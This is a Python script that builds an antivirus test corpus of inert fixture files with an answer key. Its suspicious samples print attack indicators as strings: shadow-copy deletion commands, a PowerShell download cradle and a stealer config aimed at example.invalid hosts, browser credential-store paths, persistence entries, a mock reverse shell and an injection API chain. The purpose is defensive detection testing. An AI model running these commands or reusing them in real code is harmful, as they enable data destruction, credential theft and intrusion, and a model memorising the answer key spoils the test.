import os, json, zipfile, base64, hashlib

ROOT = "Antivirus_Test_Corpus"
FIXED = (2026, 1, 1, 0, 0, 0)
HDR = {"#": "# INERT TEST FIXTURE - no operational behavior",
       "REM": "REM INERT TEST FIXTURE - no operational behavior",
       "//": "// INERT TEST FIXTURE - no operational behavior",
       "'": "' INERT TEST FIXTURE - no operational behavior",
       ";": "; INERT TEST FIXTURE - no operational behavior"}
S, B = "suspicious", "benign"
samples = []

def add(name, label, cat, why, content, pre=None):
    if isinstance(content, str):
        content = content.strip("\n") + "\n"
        if pre:
            content = HDR[pre] + "\n" + content
        content = content.encode("utf-8")
    samples.append((name, label, cat, why, content))

add("README_RESTORE_FILES.txt", S, "ransomware", "Ransom-note text with payment/deadline language; no encryption code.",
r'''
!!! YOUR DOCUMENTS HAVE BEEN LOCKED !!!
(Simulated note - no files were modified.)
To recover your data, send 0.05 BTC to: bc1qTESTTESTTESTTESTTESTTESTTESTTEST000
Contact: recovery-desk@example.invalid
Personal ID: SIM-0000-0000-0001
You have 72 hours before the decryption key is "destroyed".
Do not rename files with the .locked_sim extension.
''')

add("file_locker_sim.py", S, "ransomware", "Extension target list, XOR routine, and ransom-note logic operating only on in-memory bytes.",
r'''
TARGET_EXT = [".docx", ".xlsx", ".pdf", ".jpg", ".sql", ".bak", ".kdbx"]
KEY = b"SIMKEY01"
def xor(data, key=KEY):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
def main():
    fake_fs = {"report.docx": b"hello world", "notes.pdf": b"lorem ipsum"}
    for name, blob in fake_fs.items():
        if any(name.endswith(e) for e in TARGET_EXT):
            print(name + ".locked_sim", len(xor(blob)), "bytes (memory only)")
    print("Note: pay within 72h (simulated)")
if __name__ == "__main__":
    main()
''', "#")

add("maintenance_cleanup.bat", S, "recovery_disruption", "Echoes shadow-copy deletion, backup catalog removal and boot recovery disabling strings; nothing executed.",
r'''
@echo off
echo [SIMULATION] The following would be recovery-disruption indicators:
echo vssadmin delete shadows /all /quiet
echo wbadmin delete catalog -quiet
echo bcdedit /set {default} recoveryenabled no
echo wevtutil cl System
echo [SIMULATION] Nothing was executed.
exit /b 0
''', "REM")

add("browser_profile_audit.py", S, "credential_theft", "Browser credential-store paths, SQLite table names, DPAPI references; mock data only, no disk access.",
r'''
PATHS = [r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data",
         r"%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json",
         r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State"]
QUERY = "SELECT origin_url, username_value, password_value FROM logins"
API_NOTE = "crypt32.CryptUnprotectData / AES-GCM master key (not implemented)"
MOCK_ROWS = [("https://site.example.invalid", "user_a", b"v10" + b"\x00" * 12)]
def mock_decrypt(blob):
    return "<redacted-mock>"
if __name__ == "__main__":
    for url, user, blob in MOCK_ROWS:
        print(url, user, mock_decrypt(blob))
''', "#")

add("collector_profile.json", S, "infostealer", "Stealer-style config: wallet/browser/Discord targets, staging dir, exfil endpoint on reserved TLD.",
json.dumps({"build": "sim-0.1", "targets": ["wallet.dat", "Exodus", "Telegram/tdata", "Discord/Local Storage/leveldb", "Cookies", "Login Data"],
            "screenshots": True, "keylog_buffer_kb": 64, "staging": "%TEMP%\\~cache_sim",
            "exfil": {"url": "https://collector.example.invalid/gate.php", "method": "POST", "zip_password": "sim"},
            "enabled": False}, indent=2))

add("stage_loader.ps1", S, "suspicious_powershell", "Download-cradle, hidden window and AMSI-related strings held inside an unexecuted here-string.",
r'''
$indicators = @'
$u = 'http://example.invalid/stage2.ps1'
IEX (New-Object Net.WebClient).DownloadString($u)
powershell -NoP -W Hidden -Exec Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
Invoke-WebRequest -Uri $u -OutFile $env:TEMP\s2.ps1
'@
Write-Output ("Inert: stored " + ($indicators -split "`n").Count + " indicator lines; nothing executed.")
''', "#")

b64 = base64.b64encode("Write-Output 'inert test string'".encode("utf-16le")).decode()
add("encoded_task.ps1", S, "obfuscation", "Base64 UTF-16LE blob with -EncodedCommand-style wrapper; decoded only for display.",
r'''
$blob = '@@B64@@'
$flags = '-NoProfile -NonInteractive -EncodedCommand'
$text = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($blob))
Write-Output "Decoded for display only: $text"
'''.replace("@@B64@@", b64), "#")

add("update_check.js", S, "obfuscated_script", "Char-code string assembly of shell/downloader names, split strings and junk arrays; functions never invoked.",
r'''
var _a = ['Wscr', 'ipt.S', 'hell'];
var _b = String.fromCharCode(99, 109, 100, 32, 47, 99);
var _c = ['ht', 'tp:/', '/upd', 'ate.exa', 'mple.inv', 'alid/a.ps1'];
function _s() { return _a.join(''); }
function _u() { return _c.join('') + '|' + _b + '|ADODB.Stream|MSXML2.XMLHTTP'; }
var inert = [_s, _u].length;
''', "//")

add("startup_entry.reg.txt", S, "persistence", "Registry Run-key persistence text with misleading binary name; .txt so it cannot be imported by double-click.",
r'''
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"WindowsUpdateHelper"="C:\\Users\\Public\\Libraries\\svchost32.exe -silent"

[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]
"Shell"="explorer.exe,C:\\Users\\Public\\Libraries\\svchost32.exe"
''', None)

add("SystemHealthTask.xml", S, "persistence", "Task Scheduler XML: logon+repeat triggers, hidden flag, highest privilege, odd path; file is never imported.",
r'''
<?xml version="1.0" encoding="UTF-16"?>
<!-- INERT TEST FIXTURE - nonexistent target, never imported -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <TimeTrigger><Repetition><Interval>PT5M</Interval></Repetition><StartBoundary>2026-01-01T00:00:00</StartBoundary></TimeTrigger>
  </Triggers>
  <Principals><Principal id="A"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><Hidden>true</Hidden><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries></Settings>
  <Actions Context="A"><Exec><Command>C:\Users\Public\Libraries\svchost32.exe</Command><Arguments>--quiet</Arguments></Exec></Actions>
</Task>
''', None)

add("remote_session_sim.py", S, "remote_execution", "Reverse-shell structure (connect-back, command loop, output return) using a mock socket and TEST-NET address.",
r'''
HOST, PORT = "192.0.2.10", 4444
class MockSocket:
    def connect(self, addr): self.addr = addr
    def recv(self, n): return b"exit"
    def send(self, data): pass
def session():
    s = MockSocket()
    s.connect((HOST, PORT))
    while True:
        cmd = s.recv(1024).decode()
        if cmd.strip() == "exit":
            break
        s.send(("<would run: %s>" % cmd).encode())
if __name__ == "__main__":
    session()
    print("Mock session ended; no network used.")
''', "#")

add("loader_stub.c", S, "process_injection", "Classic injection API chain (OpenProcess/VirtualAllocEx/WriteProcessMemory/CreateRemoteThread) inside #if 0.",
r'''
#include <stdio.h>
#if 0
HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID p = VirtualAllocEx(h, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(h, p, buf, len, NULL);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)p, NULL, 0, NULL);
NtUnmapViewOfSection / SetThreadContext / ResumeThread
#endif
int main(void) { printf("inert: nothing compiled in\n"); return 0; }
''', "//")

add("Invoice_2026_0042.pdf.exe", S, "disguised_file", "Double extension, MZ magic and DOS-stub text but not a valid PE; cannot execute.",
b"MZ" + b"\x00" * 58 + b"\x80\x00\x00\x00" + b"This program cannot be run in DOS mode.\r\n$" +
b"\x00" * 32 + b"INERT TEST FIXTURE: not a valid PE image.\n" + b"\x00" * 64)

import io
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
    for n, d in [("scan_0042.pdf.js", "// inert\nvar a = ['Wscr','ipt.Shell'].join('');\n"),
                 ("readme.txt", "Please enable content to view the document (simulated lure).\n")]:
        zi = zipfile.ZipInfo(n, FIXED); zi.compress_type = zipfile.ZIP_DEFLATED
        z.writestr(zi, d)
add("invoice_bundle.zip", S, "suspicious_archive", "Archive holding a double-extension script and lure text.", buf.getvalue())

add("AutoOpenSim.bas", S, "macro_script", "VBA AutoOpen with shell/downloader strings in constants; routines only Debug.Print.",
r'''
Attribute VB_Name = "AutoOpenSim"
Const S1 As String = "WScript.Shell"
Const S2 As String = "powershell -nop -w hidden -enc <placeholder>"
Const S3 As String = "URLDownloadToFile http://example.invalid/p.bin"
Sub AutoOpen()
    MockRun S1 & " | " & S2 & " | " & S3
End Sub
Private Sub MockRun(ByVal s As String)
    Debug.Print "inert: " & Len(s)
End Sub
''', "'")

add("label_encoder_sim.py", S, "dns_tunneling", "Hex-chunks data into DNS labels under a reserved domain, beaconing interval; prints names, no resolver calls.",
r'''
DOMAIN = "t.example.invalid"
BEACON_SECONDS = 30
def labels(data, size=20):
    h = data.hex()
    return [h[i:i + size] + "." + DOMAIN for i in range(0, len(h), size)]
if __name__ == "__main__":
    for q in labels(b"inert-test-payload-0001"):
        print("would query:", q)
''', "#")

add("backup_plan.ps1", B, "admin_script", "Legitimate-looking backup planner using Compress-Archive wording; prints plan only.",
r'''
param([string]$Source = "C:\Data", [string]$Dest = "D:\Backups")
$stamp = Get-Date -Format "yyyyMMdd"
Write-Output "Plan: Compress-Archive -Path $Source -DestinationPath $Dest\backup_$stamp.zip"
Write-Output "Plan: remove archives older than 30 days (not performed)"
''', "#")

add("temp_cleanup_plan.bat", B, "admin_script", "Maintenance script mentioning delete/temp; only echoes.",
r'''
@echo off
echo Cleanup plan (dry run):
echo  - del /q %TEMP%\*.tmp
echo  - rd /s /q %TEMP%\old_cache
echo No changes made.
''', "REM")

add("file_integrity.py", B, "dev_utility", "SHA-256/base64 helper operating on an in-memory string.",
r'''
import hashlib, base64
data = b"hello integrity"
print(hashlib.sha256(data).hexdigest())
print(base64.b64encode(data).decode())
''', "#")

add("installer_autostart.nsi", B, "installer", "NSIS installer snippet with HKCU Run entry for a legitimate app autostart option.",
r'''
Name "ContosoNotes"
OutFile "ContosoNotesSetup.exe"
Section "Autostart"
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "ContosoNotes" "$INSTDIR\ContosoNotes.exe"
SectionEnd
''', ";")

add("api_client_example.py", B, "dev_utility", "HTTP client code that builds a request object but never sends it.",
r'''
import urllib.request, json
def build_request(url="https://api.example.invalid/v1/status"):
    return urllib.request.Request(url, headers={"Accept": "application/json", "User-Agent": "demo/1.0"})
if __name__ == "__main__":
    r = build_request()
    print("Prepared (not sent):", r.full_url)
''', "#")

add("security_awareness.md", B, "documentation", "Defensive training text mentioning ransomware, mimikatz, vssadmin etc. as concepts.",
r'''
<!-- INERT TEST FIXTURE -->
# Security Awareness Notes
Ransomware often deletes shadow copies (e.g. via vssadmin) and encrypts documents.
Credential dumpers such as mimikatz target LSASS memory. Defenders should monitor
for Run-key changes, encoded PowerShell, and unusual scheduled tasks.
Report suspicious email attachments to the helpdesk.
''', None)

add("LogRotateTask.xml", B, "scheduled_task", "Ordinary scheduled-task definition for log rotation under Program Files.",
r'''
<?xml version="1.0" encoding="UTF-16"?>
<!-- INERT TEST FIXTURE - nonexistent target, never imported -->
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><CalendarTrigger><StartBoundary>2026-01-01T02:00:00</StartBoundary><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger></Triggers>
  <Actions><Exec><Command>C:\Program Files\ContosoLogs\rotate.exe</Command><Arguments>--keep 14</Arguments></Exec></Actions>
</Task>
''', None)

add("bundle.min.js", B, "minified_js", "Minified/packed-looking bundle with atob decoding of a license string.",
r'''
!function(e,t){var n=function(e){return atob(e)},r=["TGljZW5zZTogTUlU"];t.lic=n(r[0]),t.v="1.4.2",e.App=t}(window,{});
''', "//")

root = os.path.abspath(ROOT)
os.makedirs(root, exist_ok=True)
key = []
for name, label, cat, why, data in samples:
    with open(os.path.join(root, name), "wb") as f:
        f.write(data)
    key.append({"filename": name, "expected_classification": label, "simulated_threat_category": cat, "explanation": why})
with open(os.path.join(root, "answer_key.json"), "w", encoding="utf-8") as f:
    json.dump(key, f, indent=2)

zpath = os.path.abspath(ROOT + ".zip")
with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
    for n in sorted(os.listdir(root)):
        zi = zipfile.ZipInfo(ROOT + "/" + n, FIXED); zi.compress_type = zipfile.ZIP_DEFLATED
        with open(os.path.join(root, n), "rb") as f:
            z.writestr(zi, f.read())

ns = sum(1 for k in key if k["expected_classification"] == S)
print(f"Generated {len(key)} samples ({ns} suspicious, {len(key) - ns} benign) + answer_key.json in {root}")
print("Archive:", zpath)